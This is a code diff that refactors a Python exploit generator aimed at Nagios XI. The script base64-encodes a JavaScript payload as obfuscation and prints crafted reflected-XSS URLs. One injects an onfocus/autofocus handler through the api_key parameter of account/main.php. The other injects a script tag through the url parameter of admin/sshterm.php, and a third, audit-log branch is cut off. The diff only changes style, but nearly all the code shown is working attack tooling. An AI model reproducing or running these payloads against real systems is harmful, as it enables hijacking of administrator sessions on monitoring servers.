@@ -25,12 +25,7 @@ if not any([args.sshterm, args.account, args.auditlog]):
 
 # add trailing slash if necessary to host value
 host = ""
-if (args.host.endswith("/")):
-    host = args.host
-else:
-    host = args.host + "/"
-
-
+host = args.host if (args.host.endswith("/")) else f"{args.host}/"
 # minify
 minified = ""
 with open(args.payload) as js_file:
@@ -44,7 +39,7 @@ with open(args.payload) as js_file:
 # some obfuscation
 b64payload = base64.b64encode(minified.encode('utf8')).decode('utf8')
 
-if (args.account):
+if args.account:
 
     # url encoded code to eval the base64 payload
     prefix = "%73%65%74%54%69%6D%65%6F%75%74%28%61%74%6F%62%28%27" # setTimeout(atob('
@@ -52,10 +47,11 @@ if (args.account):
     payload = prefix + urllib.parse.quote_plus(b64payload) + suffix
 
     # build payload url, api_key=" onfocus="console.log('payload here')" autofocus h="
-    url = host + "nagiosxi/account/main.php?%61%70%69%5F%6B%65%79=%22%20%6F%6E%66%6F%63%75%73%3D%22" + payload + "%22%20%61%75%74%6F%66%6F%63%75%73%20h=%22"
+    url = f"{host}nagiosxi/account/main.php?%61%70%69%5F%6B%65%79=%22%20%6F%6E%66%6F%63%75%73%3D%22{payload}%22%20%61%75%74%6F%66%6F%63%75%73%20h=%22"
+
     print(url)
 
-elif (args.sshterm):
+elif args.sshterm:
 
     # add code to eval the base64 payload
     prefix = "setTimeout(atob(\""
@@ -64,7 +60,8 @@ elif (args.sshterm):
 
     # build payload url
     encodedPayload = urllib.parse.quote_plus(html.escape(payload))
-    url = host + "nagiosxi/admin/sshterm.php?url=%3F%22%20srcdoc%3D%22%26lt%3B%73%63%72%69%70%74%26gt%3B" + encodedPayload + "%26lt%3B/%73%63%72%69%70%74%26gt%3B"
+    url = f"{host}nagiosxi/admin/sshterm.php?url=%3F%22%20srcdoc%3D%22%26lt%3B%73%63%72%69%70%74%26gt%3B{encodedPayload}%26lt%3B/%73%63%72%69%70%74%26gt%3B"
+
     print(url)
 
 elif (args.auditlog):
